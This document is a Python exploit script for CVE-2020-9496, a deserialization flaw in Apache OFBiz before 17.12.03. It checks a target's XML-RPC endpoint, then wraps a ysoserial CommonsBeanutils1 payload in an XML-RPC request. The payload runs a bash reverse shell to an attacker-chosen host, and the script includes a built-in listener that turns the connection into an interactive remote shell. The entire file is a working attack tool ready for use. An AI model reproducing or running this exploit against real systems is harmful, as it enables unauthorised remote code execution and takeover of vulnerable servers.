# Apache Ofbiz < 17.12.03 

# Regex:
# ^([1-5])\.(\d+)\.(\d+)$|^16\.(\d+)\.(\d+)$|^17\.(0|[1-9]|1[0-2])\.(0|1|2)$

# Server Side Request Forgery and Remote Code Execution



import requests
import argparse
import sys
import urllib3
import subprocess
import threading
import socket
import select



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



# Simple check with response from default request
def vulnerable_check(url, directory, header):  
    try:
        response = requests.post(url + directory, headers=header, data=body_input("It is r0b0ts"), verify=False)
        if response.status_code == 200 and "text/xml" in response.headers.get('Content-Type', '') and "faultString" in response.text:
            print("[+] Detected Vulnerability : True\n")
        else:
            print("[-] Detected Vulnerability : False")
            sys.exit()       
    except requests.RequestException:
            print("[!] Error Occured in Checking Vulnerable")
            sys.exit()
            

# Creating body payload with encoded revere shell script
def body_input(payload):
    body_xml = f"""<?xml version="1.0"?>
    <methodCall>
    <methodName>CVE-2020-9496 test</methodName>
    <params>
        <param>
        <value>
            <struct>
            <member>
                <name>r0b0ts</name>
                <value>
                <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                {payload}
                </serializable>
                </value>
            </member>
            </struct>
        </value>
        </param>
    </params>
    </methodCall>"""
    
    return body_xml
       

# Encoding reverse shell script with ysoserial (!!It needs to install ysoserial before this code start!!)   
def create_payload(cmd):
    curl_cmd = ['java', '-jar', 'ysoserial-master-d367e379d9-1.jar', 'CommonsBeanutils1', f'{cmd}']

    try:
        output = subprocess.run(curl_cmd, capture_output=True, text=False, check=True)

        encoding_cmd = subprocess.run(['base64'], input=output.stdout, capture_output=True, text=False, check=True)
        encoded_output = encoding_cmd.stdout.decode('utf-8').replace('\n', '')

        return encoded_output

    except subprocess.CalledProcessError as e:
        print("Error occured in creating payload")


# Start server listening for reverse shell script
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("Receive Shell Success!!")
        print("\nPut your command:")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    

                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()

# Sending request using thread for reverse shell connect
def send_request(url, vuln_dir, header, data):
    requests.post(url + vuln_dir, headers=header, data=data, verify=False)


parser = argparse.ArgumentParser(usage="""CVE-2020-9496.py -u https://*.*.*.*/ -lp 14143 -lh 0.tcp.jp.ngrok.io -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()


url = args.URL.rstrip("/")

vuln_dir = "/webtools/control/xmlrpc"
header = {'Content-Type': 'application/xml', 'Content-Length': '4200'}


vulnerable_check(url, vuln_dir, header)

if args.lhost and args.lport and args.fport:
    command = f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"


    data = body_input(create_payload(command))

    # Make client / server thread
    listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
    request_thread = threading.Thread(target=send_request, args=(url, vuln_dir, header, data))
    listen_thread.start()
    request_thread.start()
    request_thread.join()
    
else:
    print("Check your arguments")